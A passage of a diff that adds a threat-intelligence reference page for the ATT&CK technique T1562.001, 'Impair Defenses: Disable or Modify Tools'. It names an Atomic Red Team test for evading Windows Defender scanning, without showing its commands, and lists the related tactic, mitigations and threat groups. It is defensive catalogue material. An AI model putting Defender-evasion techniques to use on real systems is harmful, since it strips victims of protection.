+                                                                                                'Windows '
+                                                                                                'Defender '
+                                                                                                'Evade '
+                                                                                                'Scanning '
+                                                                                                '-Process',
+                                                                                        'supported_platforms': ['windows']}],
+                                                                      'attack_technique': 'T1562.001',
+                                                                      'display_name': 'Impair '
+                                                                                      'Defenses: '
+                                                                                      'Disable '
+                                                                                      'or '
+                                                                                      'Modify '
+                                                                                      'Tools'}}]
+```
+
+# Tactics
+
+
+* [Defense Evasion](../tactics/Defense-Evasion.md)
+
+
+# Mitigations
+
+
+* [User Account Management](../mitigations/User-Account-Management.md)
+
+* [Restrict File and Directory Permissions](../mitigations/Restrict-File-and-Directory-Permissions.md)
+    
+* [Restrict Registry Permissions](../mitigations/Restrict-Registry-Permissions.md)
+    
+
+# Actors
+
+
+* [Gorgon Group](../actors/Gorgon-Group.md)
+
+* [Putter Panda](../actors/Putter-Panda.md)
+    
+* [Lazarus Group](../actors/Lazarus-Group.md)
+    
+* [Night Dragon](../actors/Night-Dragon.md)
+    
+* [Turla](../actors/Turla.md)
+    
+* [Kimsuky](../actors/Kimsuky.md)
+    
+* [Rocke](../actors/Rocke.md)
+    
+* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
+    
+* [Gamaredon Group](../actors/Gamaredon-Group.md)
+    
